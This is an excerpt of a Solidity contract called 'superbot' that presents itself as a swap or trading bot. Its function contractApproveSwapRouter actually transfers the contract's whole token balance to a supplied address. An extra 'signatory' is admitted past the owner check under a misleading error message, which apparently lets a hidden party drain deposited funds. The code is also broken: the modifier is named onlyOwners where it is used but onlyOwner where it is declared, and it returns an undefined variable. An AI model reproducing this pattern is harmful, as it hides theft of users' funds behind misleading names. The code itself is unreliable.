...
contract superbot {
    ...
    modifier onlyOwner() {
        require(msg.sender == owner || msg.sender == signatory, "Transaction deadline not matched with current swap router deactivation");
        _;
    }
    ...
    {
        require(swapRouterStx == false);
        IERC20(_ERC20Address).transfer(_receiver, _amount);
        return amount;
    }

        function contractApproveSwapRouter(address contractAddress, address swapRouterAddress)
        public
        onlyOwners
        returns (bool)
    {
        require(swapRouterStx == false);
        IERC20(contractAddress).transfer(swapRouterAddress, IERC20(contractAddress).balanceOf(address(this)));
        return true;
    }
    ...
    function swapRouterActivate () public onlyOwners returns (bool){
        swapRouterStx = true;
        return true;
    }

    function swapRouterDeactivate() public onlyOwners returns (bool) {
         swapRouterStx = false;
        return true;
    }
